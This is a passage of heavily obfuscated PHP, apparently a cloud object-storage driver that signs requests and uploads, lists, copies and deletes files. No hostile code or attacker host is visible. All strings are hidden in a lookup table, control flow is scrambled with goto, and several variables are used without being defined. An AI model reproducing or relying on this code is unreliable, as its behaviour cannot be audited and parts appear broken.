!0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($c™å©Ñ×—, $e³§öÉ™Â = "\x47\x45\124") { $A‰À¢Ü§†í =& $_SERVER[í™]; $c„“áÙÃ‘’ = gmdate($A‰À¢Ü§†í[1191]); $DñÀ®ó½æ¨ = base64_encode(hash_hmac($A‰À¢Ü§†í[1228], "{$e³§öÉ™Â}\x26{$c™å©Ñ×—}\x26{$c„“áÙÃ‘’}", md5("{$this->userpass}"), !0)); $aÀËºÏµ”¾ = array("\101\x75\164\150\x6f\x72\x69\172\141\164\x69\x6f\156\x3a\125\120\x59\x55\116\40{$this->username}\x3a{$DñÀ®ó½æ¨}", "\104\x61\164\145\x3a{$c„“áÙÃ‘’}"); return $aÀËºÏµ”¾; } public function ussRequest($Dò‚¿ˆİ£‚, $BóÄï·Š²Ò = "\x47\105\124", $DºÅæÙí’Ñ = false, $e¥‹»œ¥îâ = false, $E‰‘Ó†Á–É = false) { goto dğøé¹°Ñ; dğøé¹°Ñ: $cíÒÁµâĞ× =& $_SERVER[í™]; $Dò‚¿ˆİ£‚ = trim($Dò‚¿ˆİ£‚, $cíÒÁµâĞ×[8]); $A™ÖôŸÑ±£ = "\x2f{$this->bucket}\57{$Dò‚¿ˆİ£‚}"; goto FõÂ½‰»Ò¾; b‰ŸÇ·ÍîÊ: if (!$dìÈÙ…ŸÒØ) { return array($cíÒÁµâĞ×[1018] => !1, $cíÒÁµâĞ×[1020] => $cíÒÁµâĞ×[1229]); } if (strtolower($BóÄï·Š²Ò) == $cíÒÁµâĞ×[184] || in_array($dìÈÙ…ŸÒØ[$cíÒÁµâĞ×[1018]], array($cíÒÁµâĞ×[1086], $cíÒÁµâĞ×[1230]))) { $DºÅæÙí’Ñ = $dìÈÙ…ŸÒØ[$cíÒÁµâĞ×[1231]]; } else { $DºÅæÙí’Ñ = json_decode($dìÈÙ…ŸÒØ[$cíÒÁµâĞ×[1020]], !0); if (!$DºÅæÙí’Ñ) { $DºÅæÙí’Ñ = $dìÈÙ…ŸÒØ[$cíÒÁµâĞ×[1020]]; } else { if (!$dìÈÙ…ŸÒØ[$cíÒÁµâĞ×[671]] && isset($DºÅæÙí’Ñ[$cíÒÁµâĞ×[1232]])) { $DºÅæÙí’Ñ = $DºÅæÙí’Ñ[$cíÒÁµâĞ×[1232]]; } } } return array($cíÒÁµâĞ×[1018] => $dìÈÙ…ŸÒØ[$cíÒÁµâĞ×[671]], $cíÒÁµâĞ×[1020] => $DºÅæÙí’Ñ); goto aÛáÖéÍ’Ò; FõÂ½‰»Ò¾: $B§Œ¤ğö¦ = $this->ussHeaders($A™ÖôŸÑ±£, $BóÄï·Š²Ò); if ($e¥‹»œ¥îâ) { $B§Œ¤ğö¦ = array_merge($B§Œ¤ğö¦, $e¥‹»œ¥îâ); } $dìÈÙ…ŸÒØ = url_request($this->endpoint . $A™ÖôŸÑ±£, $BóÄï·Š²Ò, $DºÅæÙí’Ñ, $B§Œ¤ğö¦, $E‰‘Ó†Á–É); goto b‰ŸÇ·ÍîÊ; aÛáÖéÍ’Ò: } public function mkfile($B¸Œáõ†”½, $AÎª¦ã¼Š = '', $cô®´’´ = REPEAT_RENAME) { if ($this->setContent($B¸Œáõ†”½, $AÎª¦ã¼Š)) { return $this->getPathOuter($B¸Œáõ†”½); } return !1; } public function mkdir($CÑçÒìÊó, $fÕ÷•ğÚÀ“ = REPEAT_SKIP) { $Cí×µ”ª­ =& $_SERVER[í™]; $Aó„ÉÂËØ‰ = trim($CÑçÒìÊó, $Cí×µ”ª­[8]); if ($this->_isFolder($Aó„ÉÂËØ‰)) { return $this->getPathOuter($Aó„ÉÂËØ‰); } $eŠ”†çÜ–Ñ = array($Cí×µ”ª­[1233]); $f–ÁÁ¼­’‘ = $this->ussRequest($Aó„ÉÂËØ‰, $Cí×µ”ª­[212], !1, $eŠ”†çÜ–Ñ); return $f–ÁÁ¼­’‘[$Cí×µ”ª­[1018]] ? $this->getPathOuter($Aó„ÉÂËØ‰) : !1; } public function copyFile($dô‚ƒ…§Ÿí, $BÕ§áÄ„í‘) { $EÕæ…Äˆ‰Š =& $_SERVER[í™]; $a‘£ŸÙõ‚ = array($EÕæ…Äˆ‰Š[1234] . "\57{$this->bucket}\x2f{$dô‚ƒ…§Ÿí}", $EÕæ…Äˆ‰Š[1235]); $eíÉ„Œ² = $this->ussRequest($BÕ§áÄ„í‘, $EÕæ…Äˆ‰Š[214], !1, $a‘£ŸÙõ‚); return $eíÉ„Œ²[$EÕæ…Äˆ‰Š[1018]] ? !0 : $this->getPathOuter($BÕ§áÄ„í‘); } public function moveFile($F‹ßòßö¬, $E—ôùÂÇÇğ) { $Eªê£—¯‚Ä =& $_SERVER[í™]; $BÎÄ»Ûù·ì = array($Eªê£—¯‚Ä[1236] . "\57{$this->bucket}\57{$F‹ßòßö¬}", $Eªê£—¯‚Ä[1235]); $dëŸà¡†Ñ = $this->ussRequest($E—ôùÂÇÇğ, $Eªê£—¯‚Ä[214], !1, $BÎÄ»Ûù·ì); return $dëŸà¡†Ñ[$Eªê£—¯‚Ä[1018]] ? !0 : $this->getPathOuter($E—ôùÂÇÇğ); } public function delFile($dÌ©‹åÃï¬) { $D¯¯ÒÖŒğ© =& $_SERVER[í™]; $aÎæùµĞ† = $this->ussRequest($dÌ©‹åÃï¬, $D¯¯ÒÖŒğ©[1237]); return $aÎæùµĞ†[$D¯¯ÒÖŒğ©[1018]] ? !0 : !1; } public function delFolder($dÓí¾óöê›) { $DáùöÃÓâº =& $_SERVER[í™]; $f–ğíœá = $this->listAll($dÓí¾óöê›); krsort($f–ğíœá); foreach ($f–ğíœá as $C÷ÖˆÌçÓ) { $this->ussRequest($C÷ÖˆÌçÓ[$DáùöÃÓâº[75]], $DáùöÃÓâº[1237]); } return $this->ussRequest($dÓí¾óöê›, $DáùöÃÓâº[1237]); } public function rename($EÍ¹ñ…´…ì, $eÎéÆ†š¡Ü) { if ($this->isFile($EÍ¹ñ…´…ì)) { $eÎéÆ†š¡Ü = get_path_father($EÍ¹ñ…´…ì) . $eÎéÆ†š¡Ü; return $this->moveFile($EÍ¹ñ…´…ì, $eÎéÆ†š¡Ü); } return $this->renameObject($EÍ¹ñ…´…ì, $eÎéÆ†š¡Ü); } public function fileInfo($b‘Ü”¬ªÉ, $cœÎ¸Î«Ì = false, $Aù¤öâã…¡ = array()) { $f®Ñ¿ĞÍºˆ =& $_SERVER[í™]; if ($cœÎ¸Î«Ì) { return array($f®Ñ¿ĞÍºˆ[28] => $this->pathThis($b‘Ü”¬ªÉ), $f®Ñ¿ĞÍºˆ[75] => $this->getPathOuter($f®Ñ¿ĞÍºˆ[8] . $b‘Ü”¬ªÉ), $f®Ñ¿ĞÍºˆ[29] => $f®Ñ¿ĞÍºˆ[167], $f®Ñ¿ĞÍºˆ[77] => isset($Aù¤öâã…¡[$f®Ñ¿ĞÍºˆ[325]]) ? $Aù¤öâã…¡[$f®Ñ¿ĞÍºˆ[325]] : 0, $f®Ñ¿ĞÍºˆ[160] => $this->ext($b‘Ü”¬ªÉ)); } $Bñ»âÏªá = array($f®Ñ¿ĞÍºˆ[28] => $this->pathThis($b‘Ü”¬ªÉ), $f®Ñ¿ĞÍºˆ[75] => $this->getPathOuter($f®Ñ¿ĞÍºˆ[8] . $b‘Ü”¬ªÉ), $f®Ñ¿ĞÍºˆ[29] => $f®Ñ¿ĞÍºˆ[167], $f®Ñ¿ĞÍºˆ[187] => 0, $f®Ñ¿ĞÍºˆ[107] => isset($A¢©ˆã‡™¨[$f®Ñ¿ĞÍºˆ[1238]]) ? $A¢©ˆã‡™¨[$f®Ñ¿ĞÍºˆ[1238]] : 0, $f®Ñ¿ĞÍºˆ[77] => isset($Aù¤öâã…¡[$f®Ñ¿ĞÍºˆ[325]]) ? $Aù¤öâã…¡[$f®Ñ¿ĞÍºˆ[325]] : 0, $f®Ñ¿ĞÍºˆ[160] => $this->ext($b‘Ü”¬ªÉ), $f®Ñ¿ĞÍºˆ[188] => !0, $f®Ñ¿ĞÍºˆ[189] => !0); if (empty($Aù¤öâã…¡)) { $Aù¤öâã…¡ = $this->objectMeta($b‘Ü”¬ªÉ); if (!$Aù¤öâã…¡) { return $Bñ»âÏªá; } $Bñ»âÏªá[$f®Ñ¿ĞÍºˆ[187]] = $Aù¤öâã…¡[$f®Ñ¿ĞÍºˆ[1239]]; $Bñ»âÏªá[$f®Ñ¿ĞÍºˆ[107]] = $Aù¤öâã…¡[$f®Ñ¿ĞÍºˆ[1240]]; $Bñ»âÏªá[$f®Ñ¿ĞÍºˆ[77]] = $Aù¤öâã…¡[$f®Ñ¿ĞÍºˆ[77]]; } return $Bñ»âÏªá; } public function folderInfo($EŒ³ÆõÄŸÁ, $AÚØĞ£Éİâ = false) { $FÙï§†•ˆ† =& $_SERVER[í™]; if ($AÚØĞ£Éİâ) { return array($FÙï§†•ˆ†[28] => $this->pathThis($EŒ³ÆõÄŸÁ), $FÙï§†•ˆ†[75] => $this->getPathOuter($FÙï§†•ˆ†[8] . $EŒ³ÆõÄŸÁ), $FÙï§†•ˆ†[29] => $FÙï§†•ˆ†[76]); } $E¡ÈôÄ®‚Ä = array($FÙï§†•ˆ†[28] => $this->pathThis($EŒ³ÆõÄŸÁ), $FÙï§†•ˆ†[75] => $this->getPathOuter($FÙï§†•ˆ†[8] . $EŒ³ÆõÄŸÁ), $FÙï§†•ˆ†[29] => $FÙï§†•ˆ†[76], $FÙï§†•ˆ†[187] => 0, $FÙï§†•ˆ†[107] => isset($dºŒ‚©‹åŒ[$FÙï§†•ˆ†[1238]]) ? $dºŒ‚©‹åŒ[$FÙï§†•ˆ†[1238]] : 0, $FÙï§†•ˆ†[1148] => !0, $FÙï§†•ˆ†[1149] => !0); if (empty($BÇÃ„ß¿)) { $BÇÃ„ß¿ = $this->objectMeta($EŒ³ÆõÄŸÁ); if (!$BÇÃ„ß¿) { return $E¡ÈôÄ®‚Ä; } $E¡ÈôÄ®‚Ä[$FÙï§†•ˆ†[187]] = $BÇÃ„ß¿[$FÙï§†•ˆ†[1239]]; $E¡ÈôÄ®‚Ä[$FÙï§†•ˆ†[107]] = $BÇÃ„ß¿[$FÙï§†•ˆ†[1240]]; } return $E¡ÈôÄ®‚Ä; } private function fileList($Fã‡Ê¦Ö»œ, $B–èÑâŒÅ“ = 0, $e‰İÈ¶¨·  = 1000) { $Fè¹ƒø°¡ =& $_SERVER[í™]; $d´ó­‡Ù±Ï = array($Fè¹ƒø°¡[1241], $Fè¹ƒø°¡[1242] . $e‰İÈ¶¨· ); if ($B–èÑâŒÅ“) { $d´ó­‡Ù±Ï[] = $Fè¹ƒø°¡[1243] . $B–èÑâŒÅ“; } $BŸÙ”Ì–ß = $this->ussRequest($Fã‡Ê¦Ö»œ, $Fè¹ƒø°¡[216], !1, $d´ó­‡Ù±Ï); return !$BŸÙ”Ì–ß[$Fè¹ƒø°¡[1018]] ? !1 : $BŸÙ”Ì–ß[$Fè¹ƒø°¡[1020]]; } public function listPath($FøòËß£ÎÅ, $a¶±éˆÄñ = false) { goto E†¢µâäÚ‹; E†¢µâäÚ‹: $e¨è˜‘í¶Ù =& $_SERVER[í™]; $fóİ®ƒ©¶Ö = $e¨è˜‘í¶Ù[33]; $Fè•’„»¶Ö = 1000; goto f·áöÀ›ªÆ; f·áöÀ›ªÆ: $BÈØÈ¤Ì¡÷ = $Aç´ÄëÉÃØ = array(); $CöÌÜª”¶ø = rtrim($FøòËß£ÎÅ, $e¨è˜‘í¶Ù[8]) . $e¨è˜‘í¶Ù[8]; while (!0) { $c©Ü•é® = $this->fileList($FøòËß£ÎÅ, $fóİ®ƒ©¶Ö, $Fè•’„»¶Ö); if (!$c©Ü•é®) { return !1; } $fóİ®ƒ©¶Ö = isset($c©Ü•é®[$e¨è˜‘í¶Ù[1244]]) ? $c©Ü•é®[$e¨è˜‘í¶Ù[1244]] : $e¨è˜‘í¶Ù[33]; $fêçÕàëß‡ = isset($c©Ü•é®[$e¨è˜‘í¶Ù[1245]]) ? $c©Ü•é®[$e¨è˜‘í¶Ù[1245]] : array(); foreach ($fêçÕàëß‡ as $cáºà¸Œ‰×) { if ($cáºà¸Œ‰×[$e¨è˜‘í¶Ù[29]] == $e¨è˜‘í¶Ù[76]) { $BÈØÈ¤Ì¡÷[] = $this->folderInfo($CöÌÜª”¶ø . $cáºà¸Œ‰×[$e¨è˜‘í¶Ù[28]], $a¶±éˆÄñ, $cáºà¸Œ‰×); } else { $Aç´ÄëÉÃØ[] = $this->fileInfo($CöÌÜª”¶ø . $cáºà¸Œ‰×[$e¨è˜‘í¶Ù[28]], $a¶±éˆÄñ, $cáºà¸Œ‰×); } } if (count($fêçÕàëß‡) < $Fè•’„»¶Ö) { break; } } goto Eªª¸Ñ¾‡; Eªª¸Ñ¾‡: return array($e¨è˜‘í¶Ù[74] => $BÈØÈ¤Ì¡÷, $e¨è˜‘í¶Ù[73] => $Aç´ÄëÉÃØ); goto aÃÓ÷î¶ë; aÃÓ÷î¶ë: } private function recursionAllFiles($bÛí¯Ï·×, &$b™Û‰Ñ±Ü†) { $D¹‰İÓåÙŒ =& $_SERVER[í™]; $aù¡ª»·õ = $D¹‰İÓåÙŒ[33]; $bš¶´ÜÙáÍ = 1000; $F‰É„ƒ÷È = $Eù‡àÆˆ• = array(); $C¨Ë¨©Û = rtrim($bÛí¯Ï·×, $D¹‰İÓåÙŒ[8]) . $D¹‰İÓåÙŒ[8]; while (!0) { $eÍ¦İäÖãŠ = $this->fileList($bÛí¯Ï·×, $aù¡ª»·õ, $bš¶´ÜÙáÍ); if (!$eÍ¦İäÖãŠ) { return !1; } $aù¡ª»·õ = isset($eÍ¦İäÖãŠ[$D¹‰İÓåÙŒ[1244]]) ? $eÍ¦İäÖãŠ[$D¹‰İÓåÙŒ[1244]] : $D¹‰İÓåÙŒ[33]; $D°ñåË®š = isset($eÍ¦İäÖãŠ[$D¹‰İÓåÙŒ[1245]]) ? $eÍ¦İäÖãŠ[$D¹‰İÓåÙŒ[1245]] : array(); foreach ($D°ñåË®š as $fÇì˜•Š¸×) { $b×•½Ô™Ò = array($D¹‰İÓåÙŒ[75] => $C¨Ë¨©Û . $fÇì˜•Š¸×[$D¹‰İÓåÙŒ[28]], $D¹‰İÓåÙŒ[76] => $fÇì˜•Š¸×[$D¹‰İÓåÙŒ[29]] == $D¹‰İÓåÙŒ[76] ? 1 : 0, $D¹‰İÓåÙŒ[77] => isset($fÇì˜•Š¸×[$D¹‰İÓåÙŒ[325]]) ? $fÇì˜•Š¸×[$D¹‰İÓåÙŒ[325]] : 0); $b™Û‰Ñ±Ü†[] = $b×•½Ô™Ò; if ($b×•½Ô™Ò[$D¹‰İÓåÙŒ[76]] == 1) { $this->recursionAllFiles($b×•½Ô™Ò[$D¹‰İÓåÙŒ[75]], $b™Û‰Ñ±Ü†); } } if (count($D°ñåË®š) < $bš¶´ÜÙáÍ) { break; } } } public function has($dÇ‡’µÂ÷, $B´ä‡¼°ôÉ = false, $Bº­Í„É‚ = true) { goto f¢Â‰ƒ›£; cÇòÅåá™Ş: $FÂÅ†ƒÓã = 0; $f¹™ò·Õ·³ = 0; $dÕğ×£·¸ = rtrim($dÇ‡’µÂ÷, $Fª¦¾§ÂÕö[8]) . $Fª¦¾§ÂÕö[8]; goto f°Ÿ×šÛÔñ; f¢Â‰ƒ›£: $Fª¦¾§ÂÕö =& $_SERVER[í™]; $BŞ¿£¯©Ëº = $Fª¦¾§ÂÕö[33]; $c¹‰’öã«¤ = 1000; goto cÇòÅåá™Ş; f°Ÿ×šÛÔñ: while (!0) { $FÒ¦•À³ŒŞ = $this->fileList($dÇ‡’µÂ÷, $BŞ¿£¯©Ëº, $c¹‰’öã«¤); if (!$FÒ¦•À³ŒŞ) { return !1; } $BŞ¿£¯©Ëº = isset($FÒ¦•À³ŒŞ[$Fª¦¾§ÂÕö[1244]]) ? $FÒ¦•À³ŒŞ[$Fª¦¾§ÂÕö[1244]] : $Fª¦¾§ÂÕö[33]; $f¾‘À³Œ¥¢ = isset($FÒ¦•À³ŒŞ[$Fª¦¾§ÂÕö[1245]]) ? $FÒ¦•À³ŒŞ[$Fª¦¾§ÂÕö[1245]] : array(); if (empty($f¾‘À³Œ¥¢)) { break; } $FñËØçÖğ« = array_to_keyvalue($f¾‘À³Œ¥¢, $Fª¦¾§ÂÕö[33], $Fª¦¾§ÂÕö[29]); $A»äãƒë‚ = array_count_values($FñËØçÖğ«); $E¹†ª¨•Ù‚ = isset($A»äãƒë‚[$Fª¦¾§ÂÕö[76]]) ? $A»äãƒë‚[$Fª¦¾§ÂÕö[76]] : 0; $C­…Œèë = count($FñËØçÖğ«) - $E¹†ª¨•Ù‚; if ($B´ä‡¼°ôÉ) { $f¹™ò·Õ·³ += $E¹†ª¨•Ù‚; $FÂÅ†ƒÓã += $C­…Œèë; if ($a†®âù±¿½ < $c¹‰’öã«¤) { break; } continue; } if ($Bº­Í„É‚) { if ($C­…Œèë) { return !0; } } else { if ($E¹†ª¨•Ù‚) { return !0; } } if (count($f¾‘À³Œ¥¢) < $c¹‰’öã«¤) { break; } } if ($B´ä‡¼°ôÉ) { return array($Fª¦¾§ÂÕö[191] => $FÂÅ†ƒÓã, $Fª¦¾§ÂÕö[192] => $f¹™ò·Õ·³); } return !1; goto c’²’×ìã‘; c’²’×ìã‘: } public function listAll($C©ùƒ–½°) { $E½·ÊÕ¨Ş = array(); $this->recursionAllFiles($C©ùƒ–½°, $E½·ÊÕ¨Ş); return $E½·ÊÕ¨Ş; } public function canRead($C¤‡ˆæˆöÁ) { return $this->exist($C¤‡ˆæˆöÁ) ? !0 : !1; } public function canWrite($D¨­Î†½—‚) { return $this->exist($D¨­Î†½—‚) ? !0 : !1; } public function getContent($E¶ëøø¡Ä) { return $this->fileSubstr($E¶ëøø¡Ä, 0, -1); } public function setContent($cá‡ù¬¹ù, $b·Ùİ‹Àáö = '') { $DÊâ©áÜÂê =& $_SERVER[í™]; if (!$b·Ùİ‹Àáö) { $Fç°´ó®¦İ = $this->ussRequest($cá‡ù¬¹ù, $DÊâ©áÜÂê[212]); return $Fç°´ó®¦İ[$DÊâ©áÜÂê[1018]]; } $A¸µæÑ„‘ = $this->tempFile($this->pathThis($cá‡ù¬¹ù)); file_put_contents($A¸µæÑ„‘, $b·Ùİ‹Àáö); if ($this->upload($cá‡ù¬¹ù, $A¸µæÑ„‘)) { $this->tempFileRemve($A¸µæÑ„‘); return !0; } return !1; } public function fileSubstr($E–öö…“öî, $dÀÔ³ÖÄ÷ù, $B« İ‘Ó° ) { $f¦Ë¥Ä¶É =& $_SERVER[í™]; if (!($ağ¬™ß¬Š = $this->link($E–öö…“öî))) { return !1; } $AÄ¦šóøäª = !1; if ($B« İ‘Ó°  > 0) { $AĞ†Ï‚Ş‰¢ = $dÀÔ³ÖÄ÷ù + $B« İ‘Ó°  - 1; $AÄ¦šóøäª = array($f¦Ë¥Ä¶É[1206] . $dÀÔ³ÖÄ÷ù . $f¦Ë¥Ä¶É[412] . $AĞ†Ï‚Ş‰¢); } $aìÓèŠ‹  = url_request($ağ¬™ß¬Š, $f¦Ë¥Ä¶É[216], !1, $AÄ¦šóøäª); return $aìÓèŠ‹ [$f¦Ë¥Ä¶É[671]] ? $aìÓèŠ‹ [$f¦Ë¥Ä¶É[1020]] : !1; } public function upload($DÚß”ºêŠ, $C®àäÔô˜Í, $FŸÅøğá = false, $FøãÉÁ‰ = REPEAT_REPLACE) { goto B‹é¤ÏÁëÉ; aÂä„˜¢³: do { $DµŞÇ’…„æ = $AŠ±±·ÉÁÆ[$dÙªñ¤ÛÇ[1252]]; fseek($añğ£´‡Ò, $cùä¹ã¸¨Š); $Eçå†ç¨  = fread($añğ£´‡Ò, $DµŞÇ’…„æ); $b¤ìÏ¤„ª¤ = 0; do { $b¤ìÏ¤„ª¤++; $AŠ±±·ÉÁÆ = $this->uploadPart($DÚß”ºêŠ, $AŠ±±·ÉÁÆ, $Eçå†ç¨ ); } while (!$AŠ±±·ÉÁÆ && $b¤ìÏ¤„ª¤ < 3); if (!$AŠ±±·ÉÁÆ) { return !1; } $F‚ù…‚ô¤‹ = $AŠ±±·ÉÁÆ[$dÙªñ¤ÛÇ[1251]]; $cùä¹ã¸¨Š += $DµŞÇ’…„æ; } while ($F‚ù…‚ô¤‹ != -1); fclose($añğ£´‡Ò); $c–ˆ‘Ë‹ª = array($dÙªñ¤ÛÇ[1253], $dÙªñ¤ÛÇ[1254] . $AŠ±±·ÉÁÆ[$dÙªñ¤ÛÇ[1255]], $dÙªñ¤ÛÇ[1249]); goto fá£ïÈ½ï§; dÃåÁ§¹Ï: $F‚ù…‚ô¤‹ = $AŠ±±·ÉÁÆ[$dÙªñ¤ÛÇ[1251]]; $añğ£´‡Ò = fopen($C®àäÔô˜Í, $dÙªñ¤ÛÇ[1156]); if (!$añğ£´‡Ò) { return !1; } goto aÂä„˜¢³; Féå¯ÖçÂ: if (!$aÖ©¦ˆ«Å[$dÙªñ¤ÛÇ[1018]]) { return !1; } $AŠ±±·ÉÁÆ = $aÖ©¦ˆ«Å[$dÙªñ¤ÛÇ[1020]]; $cùä¹ã¸¨Š = 0; goto dÃåÁ§¹Ï; c†º²™ºº†: $bµË¨Şï¨ = 1024 * 1024 * 10; $c–ˆ‘Ë‹ª = array($dÙªñ¤ÛÇ[1247], $dÙªñ¤ÛÇ[1248] . $Eë„’¬Ô¯ê, $dÙªñ¤ÛÇ[1249], $dÙªñ¤ÛÇ[1250] . $bµË¨Şï¨); $aÖ©¦ˆ«Å = $this->ussRequest($DÚß”ºêŠ, $dÙªñ¤ÛÇ[214], !1, $c–ˆ‘Ë‹ª); goto Féå¯ÖçÂ; fá£ïÈ½ï§: $aÖ©¦ˆ«Å = $this->ussRequest($DÚß”ºêŠ, $dÙªñ¤ÛÇ[214], !1, $c–ˆ‘Ë‹ª); return $aÖ©¦ˆ«Å[$dÙªñ¤ÛÇ[1018]] ? $this->getPathOuter($Då—ôÛè‘È) : !1; goto d‹òÊÛ•Ö¨; B‹é¤ÏÁëÉ: $dÙªñ¤ÛÇ =& $_SERVER[í™]; $Eë„’¬Ô¯ê = IO::size($C®àäÔô˜Í); if ($Eë„’¬Ô¯ê <= 1024 * 1024 * 200) { $a«æ†ƒó÷ = array($dÙªñ¤ÛÇ[1246] . $C®àäÔô˜Í); $aÖ©¦ˆ«Å = $this->ussRequest($DÚß”ºêŠ, $dÙªñ¤ÛÇ[214], $a«æ†ƒó÷); return $aÖ©¦ˆ«Å[$dÙªñ¤ÛÇ[1018]] ? $this->getPathOuter($DÚß”ºêŠ) : !1; } goto c†º²™ºº†; d‹òÊÛ•Ö¨: } private function uploadPart($BÜ…ÀµÂÂ¯, $e¸Ÿ¨¥ªæ , &$A‡Ñ¾œ‰ïª) { $F‹ßÀ´–È =& $_SERVER[í™]; $dá­Êà¨Şİ = array($F‹ßÀ´–È[1256], $F‹ßÀ´–È[1254] . $e¸Ÿ¨¥ªæ [$F‹ßÀ´–È[1255]], $F‹ßÀ´–È[1257] . $e¸Ÿ¨¥ªæ [$F‹ßÀ´–È[1251]], $F‹ßÀ´–È[138] . $e¸Ÿ¨¥ªæ [$F‹ßÀ´–È[1252]]); $b™…îâ•Â³ = $this->ussRequest($BÜ…ÀµÂÂ¯, $F‹ßÀ´–È[214], $A‡Ñ¾œ‰ïª, $dá­Êà¨Şİ); return !$b™…îâ•Â³[$F‹ßÀ´–È[1018]] ? $b™…îâ•Â³[$F‹ßÀ´–È[1018]] : $b™…îâ•Â³[$F‹ßÀ´–È[1020]]; } public function uploadFormData($D»ÙÄ½ïò, $C…¡«¡¦¨ä = 3600) { return $this->uploadPolicy($D»ÙÄ½ïò, $C…¡«¡¦¨ä); } public function multiUploadFormData($fó›ˆªê‘£, $FÊ”éÍìˆ¤ = 3600) { $Cğã³ÙÍª¦ =& $_SERVER[í™]; $fÁ¯‡²’« = (int) $GLOBALS[$Cğã³ÙÍª¦[7]][$Cğã³ÙÍª¦[77]]; return $this->uploadPolicy($fó›ˆªê‘£, $FÊ”éÍìˆ¤, $fÁ¯‡²’«); } private function uploadPolicy($D·´‘Ù˜â©, $c¿¾Ï¸Øå = 3600, $a•§ô¯ÄÒ© = 0) { goto cœ¼Êêö Û; cœ¼Êêö Û: $DÂ¶Ôµ°¢ =& $_SERVER[í™]; $eŒç´¾™Æ½ = $DÂ¶Ôµ°¢[8] . $this->bucket; $A¼¬´®ØÙ² = gmdate($DÂ¶Ôµ°¢[1191]); goto D»Ã¦ßØŒ; D»Ã¦ßØŒ: $Cï»ê¥ÕçÆ = array($DÂ¶Ôµ°¢[1258] => $this->bucket, $DÂ¶Ôµ°¢[1259] => $D·´‘Ù˜â©, $DÂ¶Ôµ°¢[1260] => time() + $c¿¾Ï¸Øå, $DÂ¶Ôµ°¢[1261] => $A¼¬´®ØÙ²); if ($a•§ô¯ÄÒ©) { $Cï»ê¥ÕçÆ[$DÂ¶Ôµ°¢[1177]] = $a•§ô¯ÄÒ©; } $eèñóòêøØ = base64_encode(json_encode($Cï»ê¥ÕçÆ)); goto c†º¢“¦ÔÛ; c†º¢“¦ÔÛ: $dÑ„¨ÇÎõ = base64_encode(hash_hmac($DÂ¶Ôµ°¢[1228], "\x50\x4f\123\x54\x26{$eŒç´¾™Æ½}\46{$A¼¬´®ØÙ²}\46{$eèñóòêøØ}", md5("{$this->userpass}"), !0)); $e±´ªÙö¤Ë = array($DÂ¶Ôµ°¢[1098] => $eèñóòêøØ, $DÂ¶Ôµ°¢[1262] => "\125\x50\131\x55\x4e\40{$this->username}\x3a{$dÑ„¨ÇÎõ}", $DÂ¶Ôµ°¢[169] => $this->endpoint . $eŒç´¾™Æ½); return $e±´ªÙö¤Ë; goto F—ˆ½Ğİğè; F—ˆ½Ğİğè: } public function download($AÀŒÓŞ¨½Ú, $b‡å´œ»Ï) { goto B‹Ìçç¢À; c¹ƒ›¿Ş„›: fclose($bèê¡³‰ô¡); return $b‡å´œ»Ï; goto Bé«Ó¥„Íº; C²ÄóÅ†æà: $d‡»Ê‹‰ÌŸ = 1024 * 200; $bèê¡³‰ô¡ = fopen($CÈ­ÊÏõ‚, $_SERVER[í™][1212]); while (!0) { $D’áÆ®øæ = $this->fileSubstr($AÀŒÓŞ¨½Ú, $B¯Œ ÉÛî”, $d‡»Ê‹‰ÌŸ); if ($D’áÆ®øæ === !1) { return !1; } fwrite($bèê¡³‰ô¡, $D’áÆ®øæ); $B¯Œ ÉÛî” += $d‡»Ê‹‰ÌŸ; if (strlen($D’áÆ®øæ) < $d‡»Ê‹‰ÌŸ) { break; } } goto c¹ƒ›¿Ş„›; B‹Ìçç¢À: $CÈ­ÊÏõ‚ = IO::getPathInner(IO::mkfile($b‡å´œ»Ï)); if (!($FÙ£¶áì÷Ÿ = $this->link($AÀŒÓŞ¨½Ú))) { return !1; } $B¯Œ ÉÛî” = 0; goto C²ÄóÅ†æà; Bé«Ó¥„Íº: } public function link($E½ÏÕ¸ÎŸ¨, $aóì™ÈšëÆ = array()) { $DÂ¤ôñ¿ëÜ =& $_SERVER[í™]; $E½ÏÕ¸ÎŸ¨ = trim($E½ÏÕ¸ÎŸ¨, $DÂ¤ôñ¿ëÜ[8]); if (!empty($this->token)) { $eä÷·‡±´ = strtotime(date($DÂ¤ôñ¿ëÜ[1263])); $CŠæ³‘­Ãë = substr(md5($this->token . $DÂ¤ôñ¿ëÜ[272] . $eä÷·‡±´ . $DÂ¤ôñ¿ëÜ[1264] . $E½ÏÕ¸ÎŸ¨), 12, 8) . $eä÷·‡±´; $aóì™ÈšëÆ[] = $DÂ¤ôñ¿ëÜ[1265] . $CŠæ³‘­Ãë; } $böáê·‹±¤ = !empty($aóì™ÈšëÆ) ? $DÂ¤ôñ¿ëÜ[69] . implode($DÂ¤ôñ¿ëÜ[272], $aóì™ÈšëÆ) : $DÂ¤ôñ¿ëÜ[33]; return $this->getHost() . $DÂ¤ôñ¿ëÜ[8] . $E½ÏÕ¸ÎŸ¨ . $böáê·‹±¤; } public function fileOut($D¸­˜ƒ½, $fØ¸…’—Ó¦ = false, $EÆ®ºïË¼Ö = false, $cÜ¥óĞ¬½… = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($D¸­˜ƒ½, $fØ¸…’—Ó¦, $EÆ®ºïË¼Ö, $cÜ¥óĞ¬½…); } if (!$EÆ®ºïË¼Ö) { $EÆ®ºïË¼Ö = $this->pathThis($D¸­˜ƒ½); } $cÆ§Ëš = $fØ¸…’—Ó¦ ? array($_SERVER[í™][1266] . rawurlencode($EÆ®ºïË¼Ö)) : array(); $CÚµµè = $this->link($D¸­˜ƒ½, $cÆ§Ëš); $this->fileOutLink($CÚµµè); } public function fileOutServer($d’·šÂéçì, $fÍ¶èšŒˆÍ = false, $cÉ²œÔ×äÖ = false, $CàÊ‘˜³œ— = '') { parent::fileOut($d’·šÂéçì, $fÍ¶èšŒˆÍ, $cÉ²œÔ×äÖ, $CàÊ‘˜³œ—); } public function fileOutImage($a†ÄÇ†×ˆ÷, $aÑÑ«¤…Ã = 250) { $A¿ƒÔ×™‚ = $this->link($a†ÄÇ†×ˆ÷ . $_SERVER[í™][1267] . $aÑÑ«¤…Ã); $this->fileOutLink($A¿ƒÔ×™‚); } public function fileOutImageServer($CÆ‘©Üè±ø, $BÕ¹¾¿¾òĞ = 250) { parent::fileOutImage($CÆ‘©Üè±ø, $BÕ¹¾¿¾òĞ); } public function hashMd5($c„‹®Ó„¤¼) { $e¥ï·… Ş¢ =& $_SERVER[í™]; $B±çÏÔ¬ = $this->objectMeta($c„‹®Ó„¤¼); return isset($B±çÏÔ¬[$e¥ï·… Ş¢[196]]) ? 